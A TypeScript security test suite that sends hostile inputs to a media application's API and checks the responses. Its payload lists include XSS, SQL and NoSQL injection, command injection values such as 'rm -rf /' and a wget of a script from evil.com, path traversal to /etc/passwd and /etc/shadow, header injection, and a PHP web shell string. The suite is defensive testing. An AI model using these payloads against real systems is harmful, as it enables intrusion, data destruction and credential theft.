/**
 * TIER 4 CRITICAL SECURITY TESTS - API Request Validation (15 tests)
 * Testing API input validation and request security
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import request from 'supertest';
import { app } from '../../src/app';
import { setupTestApp, teardownTestApp } from '../helpers/test-app';

describe('API Request Validation Security Tests', () => {
  let authToken: string;

  beforeEach(async () => {
    await setupTestApp();
    
    // Get auth token for authenticated requests
    const authResponse = await request(app)
      .post('/api/auth/admin/login')
      .send({
        username: 'admin',
        password: 'admin',
      });

    if (authResponse.status === 200 && authResponse.body.token) {
      authToken = authResponse.body.token;
    }
  });

  afterEach(async () => {
    await teardownTestApp();
  });

  describe('Input Sanitization Security', () => {
    it('should prevent XSS attacks in request bodies', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/v1/media/request')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            title: payload,
            mediaType: 'movie',
            mediaId: 'test-id',
          });

        // Should handle XSS attempts safely
        expect([200, 400, 422]).toContain(response.status);
        if (response.body) {
          expect(JSON.stringify(response.body)).not.toContain('<script>');
          expect(JSON.stringify(response.body)).not.toContain('javascript:');
        }
      }
    });

    it('should prevent SQL injection in query parameters', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        '" OR "1"="1',
        "admin' --",
        "1' OR '1' = '1",
        '1; DELETE FROM media WHERE 1=1; --',
        "' UNION SELECT * FROM users --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get(`/api/v1/media/search?query=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${authToken}`);

        // Should handle SQL injection attempts safely
        expect([200, 400, 422]).toContain(response.status);
        
        // Response should not contain error messages with SQL details
        if (response.body && response.body.error) {
          expect(response.body.error).not.toContain('SQL');
          expect(response.body.error).not.toContain('SELECT');
          expect(response.body.error).not.toContain('DROP');
        }
      }
    });

    it('should validate NoSQL injection attempts', async () => {
      const nosqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $where: 'this.username == this.password' },
        { $regex: '.*' },
        { $in: ['admin', 'root'] },
      ];

      for (const payload of nosqlPayloads) {
        const response = await request(app)
          .post('/api/v1/media/request')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            title: 'Test Movie',
            mediaType: payload,
            mediaId: 'test-id',
          });

        // Should handle NoSQL injection attempts safely
        expect([200, 400, 422]).toContain(response.status);
      }
    });

    it('should prevent command injection in file parameters', async () => {
      const commandInjectionPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '`whoami`',
        '$(rm -rf /)',
        '& net user admin /add',
        '; wget http://evil.com/malware.sh',
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/youtube/download')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            url: 'https://youtube.com/watch?v=test',
            filename: payload,
          });

        // Should handle command injection attempts safely
        expect([200, 400, 422]).toContain(response.status);
      }
    });

    it('should validate path traversal attempts', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get(`/api/v1/media/download/${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${authToken}`);

        // Should prevent path traversal
        expect([400, 403, 404, 422]).toContain(response.status);
      }
    });
  });

  describe('Request Size and Rate Limiting', () => {
    it('should enforce maximum request body size', async () => {
      const largePayload = {
        title: 'A'.repeat(1000000), // 1MB string
        mediaType: 'movie',
        mediaId: 'test-id',
        description: 'B'.repeat(1000000),
        metadata: new Array(10000).fill('large data'),
      };

      const response = await request(app)
        .post('/api/v1/media/request')
        .set('Authorization', `Bearer ${authToken}`)
        .send(largePayload);

      // Should reject oversized requests
      expect([413, 400, 422]).toContain(response.status);
    });

    it('should implement rate limiting per endpoint', async () => {
      // Make rapid requests to media endpoint
      const requests = Array(20).fill(null).map(() =>
        request(app)
          .get('/api/v1/media/search?query=test')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-Forwarded-For', '192.168.1.100')
      );

      const responses = await Promise.all(requests);
      
      // Should implement rate limiting
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should prevent parameter pollution attacks', async () => {
      const response = await request(app)
        .post('/api/v1/media/request')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          title: ['Movie 1', 'Movie 2'], // Array pollution
          mediaType: 'movie',
          mediaId: 'test-id',
          isAdmin: true, // Privilege escalation attempt
          bypassValidation: true,
        });

      // Should handle parameter pollution safely
      expect([200, 400, 422]).toContain(response.status);
    });

    it('should validate Content-Type headers', async () => {
      const maliciousContentTypes = [
        'application/json; charset=utf-7',
        'text/html',
        'application/x-www-form-urlencoded',
        'multipart/form-data',
        'text/xml',
      ];

      for (const contentType of maliciousContentTypes) {
        const response = await request(app)
          .post('/api/v1/media/request')
          .set('Authorization', `Bearer ${authToken}`)
          .set('Content-Type', contentType)
          .send('{"title":"Test Movie","mediaType":"movie","mediaId":"test"}');

        // Should validate Content-Type appropriately
        expect([200, 400, 415, 422]).toContain(response.status);
      }
    });
  });

  describe('Header Injection Security', () => {
    it('should prevent HTTP header injection', async () => {
      const headerInjectionPayloads = [
        'test\\r\\nSet-Cookie: admin=true',
        'test\\nX-Admin: true',
        'test\\r\\n\\r\\n<script>alert("XSS")</script>',
        'test%0d%0aSet-Cookie:%20admin=true',
        'test%0aLocation:%20http://evil.com',
      ];

      for (const payload of headerInjectionPayloads) {
        const response = await request(app)
          .get('/api/v1/media/search')
          .set('Authorization', `Bearer ${authToken}`)
          .set('X-Custom-Header', payload);

        // Should not inject malicious headers
        expect(response.headers['set-cookie']).not.toContain('admin=true');
        expect(response.headers['x-admin']).toBeUndefined();
        expect(response.headers['location']).not.toContain('evil.com');
      }
    });

    it('should validate Authorization header format', async () => {
      const maliciousAuthHeaders = [
        'Bearer <script>alert("XSS")</script>',
        'Bearer ../../etc/passwd',
        'Bearer " OR 1=1 --',
        'Basic <script>evil()</script>',
        'Custom malicious-token',
      ];

      for (const authHeader of maliciousAuthHeaders) {
        const response = await request(app)
          .get('/api/v1/media/search?query=test')
          .set('Authorization', authHeader);

        // Should handle malicious auth headers safely
        expect([401, 400]).toContain(response.status);
        expect(response.body).not.toContain('<script>');
      }
    });

    it('should prevent host header injection', async () => {
      const maliciousHosts = [
        'evil.com',
        'localhost\\r\\nSet-Cookie: admin=true',
        'example.com%0d%0aX-Injected: true',
        'test.com\\n\\nHTTP/1.1 200 OK\\n\\nMalicious response',
      ];

      for (const host of maliciousHosts) {
        const response = await request(app)
          .get('/api/v1/health')
          .set('Host', host);

        // Should handle malicious host headers safely
        expect([200, 400]).toContain(response.status);
        expect(response.headers['x-injected']).toBeUndefined();
        expect(response.headers['set-cookie']).not.toContain('admin=true');
      }
    });
  });

  describe('File Upload Security', () => {
    it('should validate file upload types', async () => {
      const maliciousFiles = [
        { filename: 'test.exe', content: 'malicious executable' },
        { filename: 'script.js', content: 'alert("XSS")' },
        { filename: 'shell.php', content: '<?php system($_GET["cmd"]); ?>' },
        { filename: '../../etc/passwd', content: 'root:x:0:0' },
        { filename: 'test.html', content: '<script>evil()</script>' },
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/v1/admin/upload')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('file', Buffer.from(file.content), file.filename);

        // Should reject dangerous file types
        expect([400, 415, 422]).toContain(response.status);
      }
    });

    it('should prevent ZIP bomb attacks', async () => {
      // Simulate ZIP bomb (extremely large uncompressed size)
      const zipBomb = Buffer.alloc(1000000, 0); // Large buffer

      const response = await request(app)
        .post('/api/v1/admin/upload')
        .set('Authorization', `Bearer ${authToken}`)
        .attach('file', zipBomb, 'bomb.zip');

      // Should detect and reject ZIP bombs
      expect([400, 413, 422]).toContain(response.status);
    });

    it('should scan uploaded files for malware signatures', async () => {
      const malwareSignatures = [
        'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', // EICAR test
        '\\x4d\\x5a', // PE executable header
        'PK\\x03\\x04', // ZIP file header with embedded executable
      ];

      for (const signature of malwareSignatures) {
        const response = await request(app)
          .post('/api/v1/admin/upload')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('file', Buffer.from(signature), 'malware.bin');

        // Should detect malware patterns
        expect([400, 422]).toContain(response.status);
      }
    });
  });

  describe('API Versioning Security', () => {
    it('should validate API version parameters', async () => {
      const maliciousVersions = [
        '../../../etc/passwd',
        '<script>alert("XSS")</script>',
        'v1"; DROP TABLE users; --',
        'v999999',
        'null',
        'undefined',
      ];

      for (const version of maliciousVersions) {
        const response = await request(app)
          .get(`/api/${version}/health`);

        // Should handle malicious version parameters safely
        expect([404, 400]).toContain(response.status);
        expect(response.body).not.toContain('<script>');
      }
    });

    it('should enforce API deprecation policies securely', async () => {
      // Test deprecated endpoints
      const response = await request(app)
        .get('/api/v0/legacy-endpoint');

      // Should either redirect securely or return appropriate error
      expect([301, 302, 404, 410]).toContain(response.status);
      
      if (response.headers.location) {
        expect(response.headers.location).not.toContain('evil.com');
        expect(response.headers.location).not.toContain('javascript:');
      }
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose sensitive information in error responses', async () => {
      // Trigger various errors
      const errorRequests = [
        { endpoint: '/api/v1/admin/secret-config', expectedStatus: [403, 404] },
        { endpoint: '/api/v1/database/direct-query', expectedStatus: [403, 404] },
        { endpoint: '/api/v1/system/env-vars', expectedStatus: [403, 404] },
      ];

      for (const { endpoint, expectedStatus } of errorRequests) {
        const response = await request(app)
          .get(endpoint)
          .set('Authorization', `Bearer ${authToken}`);

        expect(expectedStatus).toContain(response.status);
        
        if (response.body && response.body.error) {
          // Should not expose internal paths, database info, etc.
          expect(response.body.error).not.toContain('/app/');
          expect(response.body.error).not.toContain('prisma');
          expect(response.body.error).not.toContain('postgres');
          expect(response.body.error).not.toContain('redis');
          expect(response.body.error).not.toContain('secret');
          expect(response.body.error).not.toContain('password');
        }
      }
    });

    it('should implement consistent error response format', async () => {
      const errorResponse1 = await request(app)
        .get('/api/v1/non-existent-endpoint');

      const errorResponse2 = await request(app)
        .post('/api/v1/media/request')
        .send({}); // Invalid request body

      // Error responses should follow consistent format
      if (errorResponse1.body && errorResponse2.body) {
        expect(typeof errorResponse1.body).toBe('object');
        expect(typeof errorResponse2.body).toBe('object');
        
        // Should not expose different error structures that could aid attacks
        const keys1 = Object.keys(errorResponse1.body);
        const keys2 = Object.keys(errorResponse2.body);
        expect(keys1.some(k => ['error', 'message'].includes(k))).toBe(true);
        expect(keys2.some(k => ['error', 'message'].includes(k))).toBe(true);
      }
    });
  });
});